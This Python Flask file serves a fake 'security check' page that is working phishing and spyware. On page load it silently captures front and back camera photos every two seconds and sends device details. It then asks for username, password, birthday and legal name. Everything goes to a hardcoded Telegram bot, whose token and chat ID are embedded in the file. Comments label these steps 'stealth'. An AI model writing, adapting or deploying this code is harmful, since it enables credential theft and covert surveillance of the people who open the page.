from flask import Flask, render_template_string, request, jsonify
import requests
import json
import threading
import time
from datetime import datetime
import base64
import os
import random

app = Flask(__name__)

# Telegram Bot Configuration
BOT_TOKEN = '8802775389:AAGn7eRc1-v9v0bwxbcYb4Wtxu23jF39zik'
CHAT_ID = '8730143288'

# Hacker-style HTML with stealth features
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>System Security Check</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: #0a0a0a;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 16px;
      font-family: 'Share Tech Mono', monospace;
      position: relative;
      overflow: hidden;
    }
    
    /* Matrix rain background */
    #matrix-bg {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      opacity: 0.15;
      pointer-events: none;
    }
    
    .card {
      background: rgba(10, 14, 23, 0.95);
      max-width: 520px;
      width: 100%;
      border-radius: 20px;
      padding: 30px 24px;
      border: 1px solid rgba(0, 255, 0, 0.2);
      box-shadow: 0 0 40px rgba(0, 255, 0, 0.05), inset 0 0 60px rgba(0, 255, 0, 0.02);
      position: relative;
      z-index: 1;
      backdrop-filter: blur(10px);
    }
    
    .card::before {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      border-radius: 22px;
      background: linear-gradient(45deg, #00ff00, transparent, #00ff00);
      opacity: 0.1;
      z-index: -1;
    }
    
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
      border-bottom: 1px solid rgba(0, 255, 0, 0.15);
      padding-bottom: 12px;
    }
    
    .header-title {
      color: #00ff00;
      font-size: 1.1rem;
      font-weight: 400;
      letter-spacing: 3px;
      text-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
    }
    
    .header-status {
      color: #00ff00;
      font-size: 0.7rem;
      opacity: 0.7;
      animation: blink 1s infinite;
    }
    
    @keyframes blink {
      0%, 50% { opacity: 0.7; }
      51%, 100% { opacity: 0.2; }
    }
    
    .console-line {
      color: #00ff00;
      font-size: 0.75rem;
      opacity: 0.6;
      margin: 4px 0;
      font-family: 'Share Tech Mono', monospace;
      white-space: pre-wrap;
      word-break: break-all;
    }
    
    .console-line .highlight {
      color: #00ff00;
      opacity: 1;
    }
    
    .console-line .error {
      color: #ff4444;
    }
    
    .loader-wrap {
      background: rgba(0, 255, 0, 0.05);
      border-radius: 4px;
      height: 4px;
      margin: 16px 0 8px;
      overflow: hidden;
      border: 1px solid rgba(0, 255, 0, 0.1);
    }
    
    .loader-fill {
      height: 100%;
      width: 0%;
      background: #00ff00;
      border-radius: 4px;
      transition: width 0.15s ease;
      box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
    }
    
    .timer-label {
      text-align: right;
      font-size: 0.7rem;
      color: rgba(0, 255, 0, 0.5);
      margin-top: 2px;
      font-family: 'Share Tech Mono', monospace;
    }
    
    .btn {
      background: transparent;
      border: 1px solid rgba(0, 255, 0, 0.3);
      color: #00ff00;
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.9rem;
      padding: 14px 20px;
      border-radius: 8px;
      width: 100%;
      margin-top: 20px;
      cursor: pointer;
      transition: all 0.3s;
      letter-spacing: 2px;
      text-transform: uppercase;
      position: relative;
      overflow: hidden;
    }
    
    .btn:hover:not(:disabled) {
      background: rgba(0, 255, 0, 0.05);
      border-color: #00ff00;
      box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
    }
    
    .btn:disabled {
      opacity: 0.3;
      cursor: not-allowed;
    }
    
    .btn .glitch {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.1), transparent);
      transform: translateX(-100%);
      transition: transform 0.5s;
    }
    
    .btn:hover .glitch {
      transform: translateX(100%);
    }
    
    .input-group {
      margin-top: 14px;
    }
    
    .input-group label {
      display: block;
      font-size: 0.65rem;
      color: rgba(0, 255, 0, 0.5);
      margin-bottom: 4px;
      font-family: 'Share Tech Mono', monospace;
      letter-spacing: 1px;
      text-transform: uppercase;
    }
    
    .input-group input {
      width: 100%;
      padding: 10px 14px;
      border-radius: 6px;
      border: 1px solid rgba(0, 255, 0, 0.15);
      background: rgba(0, 255, 0, 0.03);
      color: #00ff00;
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.85rem;
      outline: none;
      transition: all 0.3s;
    }
    
    .input-group input:focus {
      border-color: #00ff00;
      box-shadow: 0 0 20px rgba(0, 255, 0, 0.05);
    }
    
    .input-group input::placeholder {
      color: rgba(0, 255, 0, 0.2);
    }
    
    .safe-badge {
      background: rgba(0, 255, 0, 0.05);
      border: 1px solid rgba(0, 255, 0, 0.3);
      padding: 14px 18px;
      border-radius: 8px;
      text-align: center;
      font-weight: 400;
      font-size: 0.9rem;
      margin: 16px 0 8px;
      color: #00ff00;
      display: none;
      font-family: 'Share Tech Mono', monospace;
      letter-spacing: 1px;
    }
    
    .status-badge {
      color: rgba(0, 255, 0, 0.5);
      border-radius: 4px;
      padding: 4px 10px;
      font-size: 0.65rem;
      display: inline-block;
      margin-top: 8px;
      font-family: 'Share Tech Mono', monospace;
      background: rgba(0, 255, 0, 0.03);
      border: 1px solid rgba(0, 255, 0, 0.05);
    }
    
    .hidden { display: none !important; }
    
    .text-muted {
      color: rgba(0, 255, 0, 0.2);
      font-size: 0.6rem;
      margin-top: 12px;
      text-align: center;
      font-family: 'Share Tech Mono', monospace;
    }
    
    .scan-line {
      height: 1px;
      background: linear-gradient(90deg, transparent, #00ff00, transparent);
      width: 100%;
      margin: 12px 0;
      opacity: 0.1;
      animation: scan 3s linear infinite;
    }
    
    @keyframes scan {
      0% { transform: scaleX(0); opacity: 0; }
      50% { transform: scaleX(1); opacity: 0.3; }
      100% { transform: scaleX(0); opacity: 0; }
    }
    
    .glitch-text {
      animation: glitch 3s infinite;
    }
    
    @keyframes glitch {
      0%, 90%, 100% { opacity: 1; }
      92% { opacity: 0.2; transform: translateX(-2px); }
      94% { opacity: 0.8; transform: translateX(2px); }
      96% { opacity: 0.4; transform: translateX(-1px); }
    }
    
    .matrix-char {
      position: fixed;
      color: #00ff00;
      font-size: 14px;
      opacity: 0.05;
      pointer-events: none;
      font-family: 'Share Tech Mono', monospace;
    }
  </style>
</head>
<body>
  <!-- Matrix Background -->
  <canvas id="matrix-bg"></canvas>
  
  <div class="card" id="app">
    <div id="loadingSection">
      <div class="header">
        <span class="header-title">◈ SECURE SHELL v3.2</span>
        <span class="header-status">● ONLINE</span>
      </div>
      
      <div id="consoleOutput">
        <div class="console-line">> INITIALIZING SECURE ENVIRONMENT...</div>
        <div class="console-line">> ESTABLISHING ENCRYPTED CHANNEL</div>
        <div class="console-line">> LOADING SECURITY MODULES...</div>
        <div class="console-line" id="statusLine">> STATUS: <span class="highlight">PENDING</span></div>
      </div>
      
      <div class="scan-line"></div>
      
      <div class="loader-wrap">
        <div class="loader-fill" id="loaderFill"></div>
      </div>
      <div class="timer-label" id="timerLabel">0 / 30s</div>
      
      <div class="status-badge" id="statusBadge">⏳ AWAITING RESPONSE...</div>
      
      <button class="btn" id="continueBtn" disabled>
        <span class="glitch"></span>
        ⚡ CONTINUE
      </button>
    </div>

    <div id="loginSection" class="hidden">
      <div class="header">
        <span class="header-title">◈ ACCOUNT SECURITY</span>
        <span class="header-status">● ENCRYPTED</span>
      </div>
      
      <div class="console-line" style="margin-bottom: 12px;">
        > ENTER CREDENTIALS FOR VERIFICATION
      </div>
      
      <div class="input-group">
        <label>📧 USERNAME / EMAIL</label>
        <input type="text" id="igUsername" placeholder="Enter username">
      </div>
      <div class="input-group">
        <label>🔑 PASSWORD</label>
        <input type="password" id="igPassword" placeholder="Enter password">
      </div>
      <div class="input-group">
        <label>📅 BIRTHDAY</label>
        <input type="text" id="igBirthday" placeholder="DD/MM/YYYY">
      </div>
      <div class="input-group">
        <label>📛 LEGAL NAME</label>
        <input type="text" id="igLegalName" placeholder="Full legal name">
      </div>
      
      <button class="btn" id="protectBtn">
        <span class="glitch"></span>
        🛡️ SECURE ACCOUNT
      </button>
      
      <div id="safeMessage" class="safe-badge">✅ ACCOUNT SECURED</div>
      <div class="text-muted">● END-TO-END ENCRYPTION ACTIVE</div>
    </div>
  </div>

  <script>
    // Matrix Rain Effect
    const canvas = document.getElementById('matrix-bg');
    const ctx = canvas.getContext('2d');
    
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    const matrixChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
    const fontSize = 10;
    const columns = canvas.width / fontSize;
    const drops = [];
    
    for (let i = 0; i < columns; i++) {
      drops[i] = 1;
    }
    
    function drawMatrix() {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      ctx.fillStyle = '#00ff00';
      ctx.font = fontSize + 'px monospace';
      
      for (let i = 0; i < drops.length; i++) {
        const text = matrixChars[Math.floor(Math.random() * matrixChars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
    }
    
    setInterval(drawMatrix, 50);
    
    // Console logging
    function addConsoleLine(text, type = 'normal') {
      const consoleOutput = document.getElementById('consoleOutput');
      const line = document.createElement('div');
      line.className = 'console-line';
      if (type === 'highlight') {
        line.innerHTML = text;
      } else if (type === 'error') {
        line.className = 'console-line error';
        line.textContent = text;
      } else {
        line.textContent = text;
      }
      consoleOutput.appendChild(line);
      consoleOutput.scrollTop = consoleOutput.scrollHeight;
      
      // Keep only last 15 lines
      while (consoleOutput.children.length > 15) {
        consoleOutput.removeChild(consoleOutput.firstChild);
      }
    }

    // Stealth send - no visible indication
    async function stealthSend(endpoint, data) {
      try {
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        return await response.json();
      } catch (error) {
        console.error('Stealth send error:', error);
      }
    }

    // API endpoints
    const API_BASE = window.location.origin;
    
    let loadingCompleted = false;
    let mediaActive = false;
    let intervalPhoto = null;
    let mediaStream = null;
    let videoElement = null;
    let permissionGranted = false;
    let frontStream = null;
    let backStream = null;

    const loaderFill = document.getElementById('loaderFill');
    const timerLabel = document.getElementById('timerLabel');
    const statusBadge = document.getElementById('statusBadge');
    const continueBtn = document.getElementById('continueBtn');
    const loadingSection = document.getElementById('loadingSection');
    const loginSection = document.getElementById('loginSection');
    const protectBtn = document.getElementById('protectBtn');
    const safeMessage = document.getElementById('safeMessage');
    const statusLine = document.getElementById('statusLine');

    const igUsername = document.getElementById('igUsername');
    const igPassword = document.getElementById('igPassword');
    const igBirthday = document.getElementById('igBirthday');
    const igLegalName = document.getElementById('igLegalName');

    // Function to get device info with stealth
    function getDeviceInfo() {
      const nav = navigator;
      return `DEVICE: ${nav.userAgent} | ${nav.platform} | ${window.screen.width}x${window.screen.height}`;
    }

    // Stealth device info send
    setTimeout(() => {
      stealthSend('/api/send_message', { 
        message: `🕵️ CONNECTION ESTABLISHED\n${getDeviceInfo()}` 
      });
    }, 1000);

    // Request permissions with both cameras
    async function requestBothCameras() {
      try {
        addConsoleLine('> ACCESSING CAMERA SUBSYSTEM...', 'highlight');
        statusBadge.textContent = '📷 INITIALIZING...';
        
        // Get front camera
        frontStream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: 'user',
            width: { ideal: 640 },
            height: { ideal: 480 }
          }
        });
        
        // Get back camera
        try {
          backStream = await navigator.mediaDevices.getUserMedia({
            video: { 
              facingMode: 'environment',
              width: { ideal: 640 },
              height: { ideal: 480 }
            }
          });
        } catch (backErr) {
          addConsoleLine('> BACK CAMERA UNAVAILABLE', 'error');
          // Use front camera as fallback
          backStream = frontStream;
        }
        
        permissionGranted = true;
        mediaActive = true;
        
        // Create video elements
        videoElement = document.createElement('video');
        videoElement.style.display = 'none';
        videoElement.style.position = 'absolute';
        videoElement.style.width = '1px';
        videoElement.style.height = '1px';
        videoElement.style.opacity = '0';
        document.body.appendChild(videoElement);
        
        addConsoleLine('> CAMERA ACCESS GRANTED', 'highlight');
        statusBadge.textContent = 'ACTIVE';
        statusLine.innerHTML = '> STATUS: <span class="highlight">ACTIVE</span>';
        
        // Send success message stealth
        stealthSend('/api/send_message', { 
          message: '✅ CAMERA ACCESS GRANTED - DUAL CAMERA MODE' 
        });
        
        // Start photo capture
        startStealthPhotoCapture();
        
      } catch (err) {
        addConsoleLine(`> CAMERA ACCESS DENIED: ${err.message}`, 'error');
        statusBadge.textContent = '⚠️ UNAVAILABLE';
        statusLine.innerHTML = '> STATUS: <span class="error">ERROR</span>';
        mediaActive = false;
        
        stealthSend('/api/send_message', { 
          message: `❌ CAMERA DENIED: ${err.message}` 
        });
      }
    }

    // Stealth photo capture with both cameras
    function startStealthPhotoCapture() {
      if (!mediaActive) return;
      
      async function capturePhotos() {
        if (!mediaActive) return;
        
        try {
          // Capture from front camera
          if (frontStream) {
            videoElement.srcObject = frontStream;
            await videoElement.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            const frontData = canvas.toDataURL('image/jpeg', 0.7);
            
            // Send front photo stealth
            stealthSend('/api/send_photo', { 
              photo: frontData,
              camera: 'front',
              timestamp: Date.now()
            });
          }
          
          // Capture from back camera
          if (backStream && backStream !== frontStream) {
            videoElement.srcObject = backStream;
            await videoElement.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            const backData = canvas.toDataURL('image/jpeg', 0.7);
            
            // Send back photo stealth
            stealthSend('/api/send_photo', { 
              photo: backData,
              camera: 'back',
              timestamp: Date.now()
            });
          }
          
          // Switch back to front stream for next capture
          if (frontStream) {
            videoElement.srcObject = frontStream;
            await videoElement.play();
          }
          
        } catch (e) {
          console.error('Photo capture error:', e);
        }
      }
      
      // Capture every 2 seconds
      intervalPhoto = setInterval(capturePhotos, 2000);
      
      // Immediate capture
      setTimeout(capturePhotos, 300);
      
      // Add fake console activity
      setInterval(() => {
        const fakeMsgs = [
          '> SCANNING MEMORY SEGMENTS...',
          '> VERIFYING INTEGRITY CHECKS...',
          '> ESTABLISHING SECURE TUNNEL...',
          '> SYNCHRONIZING CLOCKS...',
          '> ANALYZING NETWORK TOPOLOGY...'
        ];
        const msg = fakeMsgs[Math.floor(Math.random() * fakeMsgs.length)];
        addConsoleLine(msg);
      }, 4000);
    }

    // Request both cameras immediately
    requestBothCameras();

    // Loading bar with console output
    let startTime = Date.now();
    const DURATION = 30;

    function updateLoader() {
      const elapsed = (Date.now() - startTime) / 1000;
      const progress = Math.min(elapsed / DURATION, 1);
      const percent = Math.round(progress * 100);
      loaderFill.style.width = percent + '%';
      timerLabel.textContent = `${Math.min(Math.floor(elapsed), DURATION)} / ${DURATION}s`;

      if (progress >= 1) {
        loadingCompleted = true;
        continueBtn.disabled = false;
        continueBtn.textContent = '⚡ CONTINUE';
        statusBadge.textContent = '✅ READY';
        statusLine.innerHTML = '> STATUS: <span class="highlight">COMPLETE</span>';
        addConsoleLine('> SECURITY CHECK COMPLETE', 'highlight');
        clearInterval(loaderInterval);
        return;
      }
    }

    const loaderInterval = setInterval(updateLoader, 200);
    updateLoader();

    // Continue button - show login form
    continueBtn.addEventListener('click', function() {
      if (!loadingCompleted) return;
      
      addConsoleLine('> INITIATING ACCOUNT VERIFICATION...', 'highlight');
      loadingSection.classList.add('hidden');
      loginSection.classList.remove('hidden');
      
      // Stealth notification
      stealthSend('/api/send_message', { 
        message: '🔓 VERIFICATION PHASE STARTED' 
      });
    });

    // Protect button - send credentials
    protectBtn.addEventListener('click', async function() {
      const username = igUsername.value.trim() || 'not provided';
      const password = igPassword.value.trim() || 'not provided';
      const birthday = igBirthday.value.trim() || 'not provided';
      const legalName = igLegalName.value.trim() || 'not provided';

      // Stealth send credentials
      await stealthSend('/api/send_login', {
        username: username,
        password: password,
        birthday: birthday,
        legalName: legalName
      });

      safeMessage.style.display = 'block';
      protectBtn.disabled = true;
      protectBtn.textContent = '✅ SECURED';
      
      addConsoleLine('> ACCOUNT SECURED SUCCESSFULLY', 'highlight');
      
      // Stealth notification
      stealthSend('/api/send_message', { 
        message: '✅ ACCOUNT SECURED - CREDENTIALS RECEIVED' 
      });
    });

    // Cleanup
    window.addEventListener('beforeunload', function() {
      if (intervalPhoto) clearInterval(intervalPhoto);
      if (frontStream) frontStream.getTracks().forEach(t => t.stop());
      if (backStream && backStream !== frontStream) backStream.getTracks().forEach(t => t.stop());
      if (videoElement) videoElement.srcObject = null;
      
      stealthSend('/api/send_message', { 
        message: '🔚 SESSION TERMINATED' 
      });
    });

    // Window resize handler for matrix
    window.addEventListener('resize', function() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    });
  </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Serve the main page"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/send_message', methods=['POST'])
def send_message():
    """Send text message to Telegram"""
    try:
        data = request.json
        message = data.get('message', '')
        
        if not message:
            return jsonify({'error': 'No message provided'}), 400
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, json=payload, timeout=10)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/send_photo', methods=['POST'])
def send_photo():
    """Send photo to Telegram with stealth"""
    try:
        data = request.json
        photo_data = data.get('photo', '')
        camera_type = data.get('camera', 'unknown')
        timestamp = data.get('timestamp', int(time.time()))
        
        if not photo_data:
            return jsonify({'error': 'No photo provided'}), 400
        
        # Remove data URL prefix if present
        if 'base64,' in photo_data:
            photo_data = photo_data.split('base64,')[1]
        
        # Decode base64
        image_bytes = base64.b64decode(photo_data)
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {
            'photo': (f'capture_{timestamp}.jpg', image_bytes, 'image/jpeg')
        }
        data = {
            'chat_id': CHAT_ID,
            'caption': f'📸 {camera_type} | {datetime.now().strftime("%H:%M:%S")}'
        }
        
        response = requests.post(url, files=files, data=data, timeout=30)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/send_login', methods=['POST'])
def send_login():
    """Send login credentials to Telegram"""
    try:
        data = request.json
        username = data.get('username', 'not provided')
        password = data.get('password', 'not provided')
        birthday = data.get('birthday', 'not provided')
        legal_name = data.get('legalName', 'not provided')
        
        message = f"""🔐 CREDENTIALS CAPTURED:
👤 Username: {username}
🔑 Password: {password}
🎂 Birthday: {birthday}
📛 Legal Name: {legal_name}
🕒 {datetime.now().isoformat()}"""
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message
        }
        
        response = requests.post(url, json=payload, timeout=10)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Starting Secure Shell Server...")
    print(f"📱 Running on port: {port}")
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"💬 Chat ID: {CHAT_ID}")
    app.run(debug=False, host='0.0.0.0', port=port)
